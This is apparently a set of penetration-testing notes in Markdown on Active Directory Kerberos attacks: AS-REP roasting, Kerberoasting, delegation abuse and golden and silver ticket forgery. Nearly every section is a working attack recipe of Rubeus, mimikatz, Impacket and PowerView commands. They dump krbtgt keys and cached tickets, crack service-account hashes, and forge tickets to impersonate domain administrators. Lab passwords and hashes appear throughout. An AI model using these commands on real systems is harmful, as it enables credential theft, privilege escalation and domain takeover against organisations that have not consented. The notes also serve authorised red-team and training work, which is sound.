# Content
- [Roasting attacks](#roasting-attacks)
  - [AS-REQ Roasting](#as-req-roasting)
  - [Kerberoasting](#kerberoasting)
- [Delegation attacks](#delegation-attacks)
  - [Unconstrained delegation](#unconstrained-delegation)
  - [Constrained Delegation](#constrained-delegation)
  - [Resource-based constrained delegation](#resource-based-constrained-delegation)
- [Ticket abuse](#ticket-abuse)
  - [Golden ticket](#golden-ticket)
  - [Silver ticket](#silver-ticket)  

# Roasting attacks

## AS-REQ Roasting
- AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
- Since part of that message is encrypted using the user’s password, it is possible to perform an offline brute-force attack to try and retrieve the user's password.
- The only information an attacker requires is the username they want to attack, which can also be found using other enumeration techniques.
- if you have `GenericWrite/GenericAll` rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value


it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
![Screenshot 2024-06-18 at 12-41-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ebe87f88-c284-4848-ae60-bf1cedd3316c)


### Enumerating vulnerable users (need domain credentials)
```shell
# windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
```

### Request AS_REP message
```powershell
# Windows 
## Rubeus 
### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
.\Rubeus.exe asreproast  /nowrap /format:hashcat
### Targeted account
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] /nowrap /format:hashcat


## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
Get-ASREPHash -Username VPN114user -verbose 

# Linux
# GetNPUsers
## Try all the usernames in usernames.txt
GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 172.16.2.5  -no-pass 
## try one username
GetNPUsers.py <domain>/<username>  -format hashcat -outputfile hashes.asreproast -dc-ip 10.129.159.45 -no-pass  
## Use domain creds 
GetNPUsers.py <domain>/<username>:<pass> -request -format hashcat -outputfile hashes.asreproast

# kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
### crack
```shell
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

## Kerberoasting 
- Kerberoasting focuses on the acquisition of TGS tickets, specifically those related to services operating under user accounts in Active Directory (AD)
- Kerberoasting is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service.
- Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. 


### From Linux 

**GetUserSPNs.py**
```shell
# Listing SPN Accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Requesting all TGS Tickets that this user can request 
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Saving the TGS Ticket to an Output File
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Cracking the Ticket Offline with Hashcat**
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

**Testing Authentication against a Domain Controller**
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
### from Windows

#### setspn.exe manual method 
Enumerating SPNs and request tickets with setspn.exe

```powershell
# Enumerating SPNs
setspn.exe -Q */*

# Targeting a Single User Ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extracting Tickets from Memory with Mimikatz , after requesting the tickets using `setspn.exe` now we need to extract it 
``` powershell
# extract tickets as .kirbi
.\mimikatz.exe  "kerberos::list /export" "exit"

# extract tickets as base64
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"

# Preparing the Base64 Blob for Cracking
echo "<base64 blob>" |  tr -d \\n  > encoded_file

# Placing the Output into a File as .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file)
kirbi2john sqldev.kirbi

# Modifiying crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

#### PowerView method 

```powershell
# Using PowerView to enumrate SPNs
import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

#### Rubeus method 

```powershell
# Using the /stats Flag (get SPNs count , encryption types and latest change date)
.\Rubeus.exe kerberoast /stats

# get all spns and hashes
Rubeus.exe kerberoast

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Using the /nowrap Flag ( nowrap flag prevents any base64 ticket blobs from being column wrapped for any function)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Encryption Types
- check the [chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) to see every decmial value and the corresponding encryption type
- check hashcat [hashs' id](https://hashcat.net/wiki/doku.php?id=example_hashes)
```powershell
# check encryption type
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# downgrade to RC4 ( /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket )
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```
| Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
|-------------------|-----------------|--------------|------------|
| $krb5tgs$23$      | RC4-HMAC        | 23           | 13100      |
| $krb5tgs$17$      | AES-128         | 17           | 19600      |
| $krb5tgs$18$      | AES-256         | 18           | 19700      |


```powershell 
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

- `RC4` is the fastest to crack
- downgrading do not work after windows server 2019 and above
- Windows Server 2019 Domain Controller will always return a service ticket encrypted with the highest level of encryption supported by the target account. 
- Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets
- edit encryption types used by Kerberos
```
It is possible to edit the encryption types used by Kerberos.
This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options,
then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.
Removing all other encryption types except for RC4_HMAC_MD5
```

# Delegation attacks


## Concepts
S4U2Self (Service for User to Self):
- This part of the delegation allows a service (like a web server or computer account) to request a Kerberos service ticket on behalf of a user.
- In this step, the service says: "I am acting as user X (e.g., a domain admin or any other user)."
- Importantly, the service doesn't need the user's password. Instead, it uses its own credentials (like the machine account's credentials) to ask the Key Distribution Center (KDC) for a ticket that represents the user.
- Once the service receives this ticket, it can use it to interact with other resources as if it were the user.

S4U2Proxy (Service for User to Proxy):
- This is the next step after S4U2Self. Once a service has a ticket for a user (from S4U2Self), it can use S4U2Proxy to request additional tickets on behalf of that user to access other services.
- For example, if a web server acting as a user needs to access a file server, it uses the S4U2Proxy request to ask the KDC for a ticket to access the file server, acting on behalf of the user.
- This allows the service to act as the user when interacting with other systems, enabling privilege escalation or lateral movement within the network, depending on the user's access rights.


## Unconstrained delegation
- Unrestricted kerberos delegation is a privilege that can be assigned to a domain computer or a user
- If a user is marked as `Account is sensitive and cannot be delegated` in AD, you will not be able to impersonate them.

### computer case
- When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory.
- The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.
### user case (service account)
- When a user (let's call them User A) authenticates to a service or application that is running under another user account (let's call it User B which have delegation rights), using Kerberos authentication, the Domain Controller (DC) provides User B with User A's Ticket Granting Ticket (TGT).
- When unconstrained delegation is enabled, the KDC includes User A's TGT inside the service ticket that is issued to User B. 

### Exploit scenarios  
1) if we have `admin privileges` inside that machine, we will be able to dump the ticket and impersonate user who logged in the machine
2) if we have creds for user with Unconstrained delegation priv we can use him to impersonate the other users (in case they already used the delegated account we already auth in the DC) . 


![Screenshot 2024-06-18 at 20-25-07 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/a00b55ca-4a12-4c9d-b0a6-4b6e8cd7e1a3)

![Screenshot 2024-06-18 at 20-47-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/8ea99855-6224-443c-913c-d0cae96922f2)


### Enumration
```shell
# List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

### Delegation
```shell
# Mimikatz
## Export tickets  
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
## import ticket
kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi

# Rubeus
## Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs
## import ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
## import ticket base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
Rubeus.exe ptt /ticket:<base64 ticket>


```

## Constrained Delegation
- Constrained delegation `TRUSTED_TO_AUTH_FOR_DELEGATION` is a “more restrictive” version of unconstrained delegation. In this case, a service has the right to impersonate a user to a well-defined list of services.


![Screenshot 2024-06-18 at 20-34-36 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/a73aff59-eb34-4f43-8c84-f3cf0eeadd38)

![Screenshot 2024-06-18 at 20-47-21 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ff8b6f98-4e34-4acb-bcd1-1de1cea0d073)


### Requirements
- Attribute `msds-allowedtodelegateto` identifies the SPNs of services the user
- If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.
- If a user is marked as `Account is sensitive and cannot be delegated` in AD, you will not be able to impersonate them.
- if the service is computer account you can get shell access but if user account you can not


check this graph from [thehacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)

![KCD mindmap BqD0fGv7](https://github.com/user-attachments/assets/2639958c-b2f4-4ebd-a90f-2aa755bae4ce)


### Enumration 

```shell
# Windows 
## Powerview
Get-NetUser -TrustedToAuth
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

```
![Screenshot 2024-06-18 at 20-42-44 Kerberos Constrained Delegation Red Team Notes](https://github.com/kiro6/penetration-testing-notes/assets/57776872/dfc45db7-65f4-412f-b58f-8b904ff5c606)


### With protocol transition
![Screenshot_5](https://github.com/user-attachments/assets/8b3283ba-a2a6-4903-bdd5-e2d19f382d02)


To abuse the constrained delegation with protocol transition, the concept is to first ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy to impersonate an admin user to the SPN on the target.


**Windows**
```powershell
# if you are using the Delegation service (in a shell of context of the service user) 
## request a delegation TGT for the user or computer
.\Rubeus.exe tgtdeleg
.\Rubeus.exe asktgt /user:<username> /password:<password> /domain:<>domain /outfile:ticket.kirbi

## Using rubeus, we can now request TGS for administrator@offense.local, who will be allowed to authenticate to CIFS/dc01.offense.local
Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
## change target service 
Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt


# if you are using diffrent shell context but you have the passowrd
.\Rubeus.exe hash /password:Slavi123
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt


# if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\dc01.offense.local\c$

## u can also use Rubeus
```

**Linux**
```shell
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password'
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'domain/username:password' -altservice 'ldap/winterfell'
# then a kerbros ticket will be cached, we will export it
export KRB5CCNAME=/path/to/ticket
wmiexec.py -k --no-pass domain/user@service

```

### Without protocol transition

![Screenshot_4](https://github.com/user-attachments/assets/97af6de9-32ef-47f4-b5ab-bf7b7dffa23f)


- To exploit the constrained delegation here we only need a forwardable TGS as administrator to any service on castelblack
- But if we do a s4u (s4u2self + s4u2proxy) like we did with protocol transition, the s4uself will send us a not forwardable TGS and the attack will fail.
- So to exploit and get the forwardable TGS we need, we first need to add a computer and use RBCD between the created computer (house$) and the computer who have delegation set (here castelblack$).
- By doing that, you can do a s4u2self followed by a s4u2proxy on the added computer and the result is a forwardable tgs on hots/castelblack$ as administrator.
- Once that done, you have the forwardable ticket to pass to s4u2proxy, and we even can change the request service with -altservice

**Linux**
```shell
# target machine: winterfall$
# machine with delgation rights: castelblack$ 
# our user: jojo
# created machine: house$


# add computer X (house)
addcomputer.py -computer-name 'house$' -computer-pass 'housepass' -dc-host 192.168.56.11 'domain/jojo:pass'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity, we need castelblack$ machine creds or any PowerfulUser creds who us able to edit msDS-AllowedToActOnBehalfOfOtherIdentity value on castelblack$ 
rbcd.py -delegate-from 'house$' -delegate-to 'castelblack$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'

# Do the s4u2self followed by the s4u2proxy on castelblack (this is the classic RBCD attack)
getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 192.168.56.11 domain/'house$':'housepass'

# s4u2proxy from constrained (castelblack) to target (winterfell) - with altservice to change the SPN in use, we must have castelblack$ creds
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket <'prev-obtained ticket'> -dc-ip 192.168.56.11 -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' domain/'castelblack$'

# export the ticket 
export KRB5CCNAME=/workspace/administrator@cifs_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache 
wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```


## Resource-based constrained delegation
- **Resource Trust:** The resource server maintains a list of trusted services or computers that are allowed to delegate on behalf of users.


### Example steps
- We have code execution on the box `WS02` in the context of `offense\Service1` user;
- User `Service1` has WRITE privilege over a target computer `WS01`;
- User `Service1` creates a new computer object `FAKE01` in Active Directory (no admin required);
- User `Service1` leverages the WRITE privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
- WS01 trusts FAKE01 due to the modified msDS-AllowedToActOnBehalfOfOtherIdentity;
- We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\administrator` who is a Domain Admin;
- Profit - we can now access the c$ share of ws01 from the computer `ws02`.

### Requirements
- you must control a machine account or user account with spn
- write `msDS-AllowedToActOnBehalfOfOtherIdentitity` attribute
- must be Windows 2012 Domain Controller or later
- It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.

check this graph from  [thehacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

![RBCD mindmap rbocZNrR](https://github.com/user-attachments/assets/d90fb055-0081-4a1e-a3f5-14506e886405)


### Enumration 

```shell
# check ms-ds-machineaccountquota
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local

# check DC version
Get-DomainController

# check object must not have the attribute msds-allowedtoactonbehalfofotheridentity 
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

### Attack from Windows


**Creating a Computer Object**
```shell
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
**Resource-based Constrained Delegation**
```shell
# activedirectory PowerShell module
$targetComputer = 'WS01'
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKE01$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked

# powerview
ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

**Execution**
```shell
# Generating RC4,AES Hash 
.\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local

# Impersonation
./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/DC.offense.local /ptt

./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/DC.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

### Attack from Linux 

```bash
# from support machine htb
# we have this user support:Ironside47pleasure40Watchful which is part of a group that that genricall on the DC$

# add computer X (house)
addcomputer.py -computer-name 'house$' -computer-pass 'housepass' -dc-host 10.129.109.105 'support.htb/support:Ironside47pleasure40Watchful'

# change msDS-AllowedToActOnBehalfOfOtherIdentity value on DC$, using support account creds  
rbcd.py -delegate-from 'house$' -delegate-to 'DC$' -dc-ip 10.129.109.105 -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'

# get the kerpros ticket 
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.109.105 'support.htb/house$:housepass'
```

# Ticket abuse
## Golden ticket
- This attack assumes a Domain Controller compromise where KRBTGT account hash will be extracted which is a requirement for a successful Golden Ticket attack.
- A Golden Ticket attack consist on the creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user through the use of the NTLM hash of the Active Directory (AD) `krbtgt` account.

### Attack
```powershell
# get krbtgt keys
## from DC memory (LSA) 
./mimikatz "lsadump::lsa /inject /name:krbtgt"
## using dcsync 
./mimikatz "privilege::debug" "lsadump::dcsync /domain:eagle.local /user:krbtgt"


# Golden Ticket
## powerview
### get domain sid
Get-DomainSID
### get user rid
Get-DomainUser -Identity Administrator 

## Rubeus
### get info about user (instead of powerview)
Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd
### use the info to forge a ticket
### /id is user(that we want to impersonate) rid
### /pgid is group user rid
### /netbios is domain name
### check the rest of params in https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ticket-forgery
Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED

## mimikatz
./mimikatz  "kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt"
./mimikatz "kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"

```

## Silver ticket
This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges.

```powershell
# Rubeus
## Forge TGS | creduser and credpassword are user have access to ldap info used to query info to forge TGS
Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob  /domain:rubeus.ghostpack.local /ptt

## krbkey and krbenctype arguments are optional  
Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob /krbkey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /krbenctype:aes256 /domain:rubeus.ghostpack.local /ptt

# mimikatz
## Forge TGS
./mimikatz "kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:admin" 
```
